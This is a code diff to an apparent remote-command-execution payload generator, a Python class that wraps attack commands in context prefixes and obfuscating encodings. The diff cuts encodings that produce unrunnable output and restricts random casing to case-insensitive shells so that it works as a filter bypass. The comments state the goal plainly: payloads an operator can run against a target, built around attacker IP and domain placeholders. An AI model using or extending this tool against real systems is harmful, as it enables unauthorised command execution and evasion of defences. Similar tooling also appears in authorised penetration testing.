@@ -1,6 +1,5 @@
 import argparse
 import base64
-import codecs
 import json
 import logging
 import random
@@ -72,6 +71,9 @@ class RCEPayloadGenerator:
         }
         self.separator_envs = {"unix", "windows", "docker", "kubernetes"}
         self.safe_detection_encodings = ["none", "url_encode", "double_url_encode"]
+        # Runners whose target parser is case-insensitive, so random_case is a
+        # meaningful keyword/WAF-bypass transform rather than a payload-breaking one.
+        self.case_insensitive_runners = {"cmd", "powershell", "sql"}
 
         # Command separators and chainers for different environments
         self.separators = {
@@ -124,21 +126,30 @@ class RCEPayloadGenerator:
         self.detection_payloads: Dict[str, List[str]] = {}
         self._load_template_payloads()
 
-        # Encoding and obfuscation techniques
+        # Encoding and obfuscation techniques.
+        #
+        # Every transform here must yield something an operator can actually run
+        # against the target. Two classes are intentionally excluded:
+        #   * Transport encodings that the channel decodes before the sink
+        #     (url/double-url) and decoder-paired blobs (base64/hex variants,
+        #     which carry an explicit "needs a decode-and-execute path" note).
+        #   * random_case, which only survives on case-insensitive parsers and
+        #     is gated per-runner in _encoding_is_compatible.
+        #
+        # Removed (previously emitted non-executable noise): rot13,
+        # rot13_then_base64, insert_special_chars, xor_polymorphic, chunk_shuffle.
+        # e.g. rot13("id") -> "vq" (runs nothing), xor/shuffle emitted literal
+        # "XOR(..):"/"shuffle::" debug strings, and insert_special_chars spliced
+        # raw %0a bytes into live shell commands.
         self.encoding_methods = {
             "none": lambda x: x,
             "url_encode": lambda x: urllib.parse.quote(x),
             "double_url_encode": lambda x: urllib.parse.quote(urllib.parse.quote(x)),
             "base64": lambda x: base64.b64encode(x.encode()).decode(),
             "hex": lambda x: x.encode().hex(),
-            "rot13": lambda x: codecs.encode(x, 'rot13'),
             "random_case": lambda x: ''.join(random.choice([c.upper(), c.lower()]) for c in x),
-            "insert_special_chars": lambda x: self.insert_special_chars(x, 0.1),
             "base64_then_url": lambda x: urllib.parse.quote(base64.b64encode(x.encode()).decode()),
-            "rot13_then_base64": lambda x: base64.b64encode(codecs.encode(x, 'rot13').encode()).decode(),
             "double_base64": lambda x: base64.b64encode(base64.b64encode(x.encode())).decode(),
-            "xor_polymorphic": self.xor_polymorphic_encode,
-            "chunk_shuffle": self.chunk_shuffle_encode,
         }
 
     def _load_template_payloads(self) -> None:
@@ -170,32 +181,6 @@ class RCEPayloadGenerator:
             logger.error("Unable to load payload templates: %s", exc)
             self.payload_categories = {}
             self.detection_payloads = {}
-
-    def insert_special_chars(self, s: str, frequency: float = 0.1) -> str:
-        """Insert special characters randomly"""
-        special_chars = ['%00', '%0a', '%0d', '%09', '%20', '%0b', '%0c']
-        result = []
-        for char in s:
-            if random.random() < frequency:
-                result.append(random.choice(special_chars))
-            result.append(char)
-        return ''.join(result)
-
-    def xor_polymorphic_encode(self, payload: str) -> str:
-        """Apply a simple XOR obfuscation with a random key and annotate the output."""
-        key = random.randint(1, 255)
-        encoded = ''.join(f"{ord(char) ^ key:02x}" for char in payload)
-        return f"XOR({key}):{encoded}"
-
-    def chunk_shuffle_encode(self, payload: str, chunk_size: int = 3) -> str:
-        """Split the payload into chunks and shuffle them to create polymorphic variants."""
-        if len(payload) <= chunk_size:
-            return payload
-
-        chunks = [payload[i:i + chunk_size] for i in range(0, len(payload), chunk_size)]
-        random.shuffle(chunks)
-        shuffled = ''.join(chunks)
-        return f"shuffle::{shuffled}"
 
     def apply_constraints(self, payload: str, sink: str) -> str:
         """Apply sink-specific constraints to payload"""
@@ -393,8 +378,11 @@ class RCEPayloadGenerator:
         return True
 
     def _encoding_is_compatible(self, enc_name: str, runner: Optional[str]) -> bool:
-        syntax_sensitive_runners = {"python", "php", "node", "javascript", "java", "dotnet", "ruby", "perl", "go", "sql"}
-        if runner in syntax_sensitive_runners and enc_name in {"random_case", "insert_special_chars", "chunk_shuffle"}:
+        # random_case only survives where the target parser is case-insensitive
+        # (Windows cmd, PowerShell, SQL keywords). Anywhere else it corrupts the
+        # command (e.g. "id" -> "iD"), so suppress it rather than emit a payload
+        # that silently fails for the operator.
+        if enc_name == "random_case" and runner not in self.case_insensitive_runners:
             return False
         return True
 
@@ -627,122 +615,6 @@ class RCEPayloadGenerator:
                 )
             except Exception as exc:
                 logger.error("Error encoding payload with %s: %s", enc_name, exc)
-
-    def generate_payloads(
-        self,
-        selected_contexts: List[str] = None,
-        selected_categories: List[str] = None,
-        selected_encodings: List[str] = None,
-        selected_environments: List[str] = None,
-        mode: str = "exploit",
-        watermark_token: Optional[str] = None,
-        max_safety: str = "intrusive",
-        include_blocking: bool = False,
-    ) -> Iterator[str]:
-        """Generate payload strings while the metadata-rich path does the heavy lifting."""
-        for record in self.generate_payload_records(
-            selected_contexts=selected_contexts,
-            selected_categories=selected_categories,
-            selected_encodings=selected_encodings,
-            selected_environments=selected_environments,
-            mode=mode,
-            watermark_token=watermark_token,
-            max_safety=max_safety,
-            include_blocking=include_blocking,
-        ):
-            yield record.payload
-
-    def _generate_detection_payloads(
-        self,
-        selected_contexts: Optional[List[str]],
-        selected_encodings: Optional[List[str]],
-        selected_environments: Optional[List[str]],
-        generated_payloads: Set[str],
-    ) -> Iterator[str]:
-        contexts = selected_contexts if selected_contexts else list(self.contexts.keys())
-        encodings = selected_encodings if selected_encodings else list(self.encoding_methods.keys())
-        environments = selected_environments if selected_environments else list(self.detection_payloads.keys())
-
-        logger.info(
-            "Generating detection payloads for contexts: %s, encodings: %s, environments: %s",
-            contexts,
-            encodings,
-            environments,
-        )
-
-        for context_name in contexts:
-            if context_name not in self.contexts:
-                logger.warning("Unknown context: %s", context_name)
-                continue
-
-            context = self.contexts[context_name]
-
-            for env in environments:
-                payloads = self.detection_payloads.get(env, [])
-                for base_payload in payloads:
-                    formatted = base_payload.replace("{attacker_ip}", self.attacker_ip)
-                    formatted = formatted.replace("{canary}", self._generate_canary())
-                    for wrapped_payload in self._encode_and_wrap(
-                        formatted,
-                        context,
-                        encodings,
-                        generated_payloads,
-                    ):
-                        yield wrapped_payload
-
-    def _generate_variations(
-        self,
-        base_payload: str,
-        context: Dict[str, str],
-        env: str,
-        encodings: List[str],
-        generated_payloads: Set[str],
-        context_name: str,
-        watermark_token: Optional[str],
-    ) -> Iterator[str]:
-        """Helper to generate payload variations with separators and encodings"""
-        formatted_payload = base_payload.replace("{attacker_ip}", self.attacker_ip).replace("{attacker_domain}", self.attacker_domain)
-
-        # Add with separators
-        if env in self.separators:
-            for sep in self.separators[env]:
-                full_payload = f"{sep}{formatted_payload}"
-                if watermark_token:
-                    full_payload = self.apply_watermark(full_payload, env, context_name, watermark_token)
-                for wrapped_payload in self._encode_and_wrap(full_payload, context, encodings, generated_payloads):
-                    yield wrapped_payload
-
-        # Add without separator
-        base_variant = formatted_payload
-        if watermark_token:
-            base_variant = self.apply_watermark(base_variant, env, context_name, watermark_token)
-
-        for wrapped_payload in self._encode_and_wrap(base_variant, context, encodings, generated_payloads):
-            yield wrapped_payload
-
-    def _encode_and_wrap(
-        self,
-        payload: str,
-        context: Dict[str, str],
-        encodings: List[str],
-        generated_payloads: Set[str],
-    ) -> Iterator[str]:
-        """Apply encodings and context wrapping"""
-        for enc_name in encodings:
-            if enc_name not in self.encoding_methods:
-                continue
-                
-            try:
-                enc_func = self.encoding_methods[enc_name]
-                encoded_payload = enc_func(payload)
-                
-                wrapped_payload = f"{context['prefix']}{encoded_payload}{context['suffix']}"
-                
-                if wrapped_payload not in generated_payloads:
-                    generated_payloads.add(wrapped_payload)
-                    yield wrapped_payload
-            except Exception as e:
-                logger.error(f"Error encoding payload: {e}")
 
     def _generate_canary(self) -> str:
         return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))
